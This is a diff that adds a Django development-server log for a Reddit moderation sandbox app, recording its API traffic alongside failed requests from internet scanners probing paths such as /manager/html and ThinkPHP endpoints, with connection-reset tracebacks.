+2021-01-25:04:03:50 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:04:03:50 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 04:03:50] "GET /manager/html HTTP/1.1" 400 66139
+[25/Jan/2021 05:09:36] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=2 HTTP/1.1" 200 0
+[25/Jan/2021 05:09:36] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=2 HTTP/1.1" 200 5632
+[25/Jan/2021 05:33:02] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[25/Jan/2021 05:33:02] "GET /reddit_logged/ HTTP/1.1" 200 4
+[25/Jan/2021 05:33:02] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[25/Jan/2021 05:33:02] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[25/Jan/2021 05:33:02] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[25/Jan/2021 05:33:02] "GET /reddit_logged/ HTTP/1.1" 200 4
+[25/Jan/2021 05:33:02] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[25/Jan/2021 05:33:02] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[25/Jan/2021 05:33:26] "OPTIONS /apply_rules/ HTTP/1.1" 200 0
+[25/Jan/2021 05:33:26] "POST /apply_rules/ HTTP/1.1" 202 0
+[25/Jan/2021 05:33:27] "OPTIONS /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 0
+[25/Jan/2021 05:33:27] "OPTIONS /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 0
+[25/Jan/2021 05:33:27] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 0
+[25/Jan/2021 05:33:27] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[25/Jan/2021 05:33:27] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6978
+[25/Jan/2021 05:33:27] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 0
+[25/Jan/2021 05:33:27] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[25/Jan/2021 05:33:27] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 10046
+[25/Jan/2021 05:33:27] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 5872
+[25/Jan/2021 05:33:27] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[25/Jan/2021 05:34:22] "POST /apply_rules/ HTTP/1.1" 202 0
+[25/Jan/2021 05:34:22] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[25/Jan/2021 05:34:22] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[25/Jan/2021 05:34:22] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[25/Jan/2021 05:34:22] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[25/Jan/2021 05:34:22] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[25/Jan/2021 05:34:22] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:05:53:14 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:05:53:14 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 05:53:14] "GET /manager/html HTTP/1.1" 400 66140
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[25/Jan/2021 05:53:14] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('205.185.121.138', 41010)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Not Found: /TP/public/index.php
+2021-01-25:05:59:22 WARNING [log.py:log_response:L230] Not Found: /TP/public/index.php
+[25/Jan/2021 05:59:22] "GET /TP/public/index.php HTTP/1.1" 404 8761
+Not Found: /TP/index.php
+2021-01-25:05:59:23 WARNING [log.py:log_response:L230] Not Found: /TP/index.php
+[25/Jan/2021 05:59:23] "GET /TP/index.php HTTP/1.1" 404 8740
+Not Found: /thinkphp/html/public/index.php
+2021-01-25:05:59:24 WARNING [log.py:log_response:L230] Not Found: /thinkphp/html/public/index.php
+[25/Jan/2021 05:59:24] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 8794
+Not Found: /html/public/index.php
+2021-01-25:05:59:24 WARNING [log.py:log_response:L230] Not Found: /html/public/index.php
+[25/Jan/2021 05:59:24] "GET /html/public/index.php HTTP/1.1" 404 8767
+Not Found: /public/index.php
+2021-01-25:05:59:26 WARNING [log.py:log_response:L230] Not Found: /public/index.php
+[25/Jan/2021 05:59:26] "GET /public/index.php HTTP/1.1" 404 8752
+Not Found: /TP/html/public/index.php
+2021-01-25:05:59:26 WARNING [log.py:log_response:L230] Not Found: /TP/html/public/index.php
+[25/Jan/2021 05:59:26] "GET /TP/html/public/index.php HTTP/1.1" 404 8776
+Not Found: /elrekt.php
+2021-01-25:05:59:26 WARNING [log.py:log_response:L230] Not Found: /elrekt.php
+[25/Jan/2021 05:59:26] "GET /elrekt.php HTTP/1.1" 404 8734
+Not Found: /index.php
+2021-01-25:05:59:27 WARNING [log.py:log_response:L230] Not Found: /index.php
+[25/Jan/2021 05:59:27] "GET /index.php HTTP/1.1" 404 8731
+Not Found: /users
+2021-01-25:05:59:27 WARNING [log.py:log_response:L230] Not Found: /users
+[25/Jan/2021 05:59:27] "POST /users?page=&size=5 HTTP/1.1" 404 8737
+[25/Jan/2021 05:59:28] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:06:50:42 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:06:50:42 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 06:50:42] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:08:09:39 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:08:09:39 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 08:09:39] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+2021-01-25:08:16:45 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+2021-01-25:08:16:45 WARNING [log.py:log_response:L230] Bad Request: /GponForm/diag_Form
+[25/Jan/2021 08:16:46] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 67095
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:08:25:24 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:08:25:24 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 08:25:24] "GET /manager/html HTTP/1.1" 400 66138
+[25/Jan/2021 09:00:40] "OPTIONS / HTTP/1.1" 200 212
+----------------------------------------
+Exception happened during processing of request from ('119.183.207.238', 4068)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /manager/html
+2021-01-25:09:01:30 WARNING [log.py:log_response:L230] Not Found: /manager/html
+[25/Jan/2021 09:01:30] "GET /manager/html HTTP/1.1" 404 8740
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:09:40:51 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:09:40:51 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 09:40:51] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:09:57:54 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:09:57:54 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 09:57:54] "GET /manager/html HTTP/1.1" 400 66140
+[25/Jan/2021 10:54:33] "GET / HTTP/1.1" 200 71
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:11:04:50 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:11:04:50 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 11:04:50] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:12:40:30 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:12:40:30 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 12:40:31] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:12:58:17 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:12:58:17 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 12:58:18] "GET /manager/html HTTP/1.1" 400 66138
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.37', 34574)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[25/Jan/2021 13:19:23] "GET / HTTP/1.1" 200 81
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.37', 46404)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[25/Jan/2021 13:19:23] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-25:13:36:26 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+2021-01-25:13:36:27 WARNING [log.py:log_response:L230] Bad Request: /
+[25/Jan/2021 13:36:34] "GET / HTTP/1.0" 400 66386
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:15:24:38 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:15:24:38 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 15:24:38] "GET /manager/html HTTP/1.1" 400 66139
+[25/Jan/2021 15:55:14] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:17:04:44 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:17:04:44 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 17:04:45] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:17:05:38 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:17:05:38 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 17:05:38] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:18:08:16 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:18:08:16 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 18:08:16] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-25:18:23:01 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+2021-01-25:18:23:01 WARNING [log.py:log_response:L230] Bad Request: /
+[25/Jan/2021 18:23:30] "GET / HTTP/1.0" 400 66834
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[25/Jan/2021 18:23:30] "GET / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('209.17.97.58', 62160)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+[25/Jan/2021 18:27:38] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:19:00:48 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:19:00:48 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 19:00:48] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:19:12:21 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /script
+2021-01-25:19:12:21 WARNING [log.py:log_response:L230] Bad Request: /script
+[25/Jan/2021 19:12:21] "GET /script HTTP/1.1" 400 66073
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:19:29:14 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:19:29:14 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 19:29:14] "GET /manager/html HTTP/1.1" 400 66138
+[25/Jan/2021 19:53:26] "GET / HTTP/1.1" 200 81
+[25/Jan/2021 19:57:39] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03\x13e£\x04KÞ\x9f\x8fµ\x07×èBg')
+[25/Jan/2021 19:57:39] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:20:20:47 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:20:20:47 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 20:20:47] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:20:36:40 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:20:36:40 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 20:36:40] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:21:02:08 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:21:02:08 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 21:02:08] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:21:14:40 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:21:14:40 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 21:14:40] "GET /manager/html HTTP/1.1" 400 66138
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[25/Jan/2021 21:14:40] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('209.141.58.37', 53496)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+[25/Jan/2021 21:50:44] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:22:13:54 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /script
+2021-01-25:22:13:54 WARNING [log.py:log_response:L230] Bad Request: /script
+[25/Jan/2021 22:13:54] "GET /script HTTP/1.1" 400 66073
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
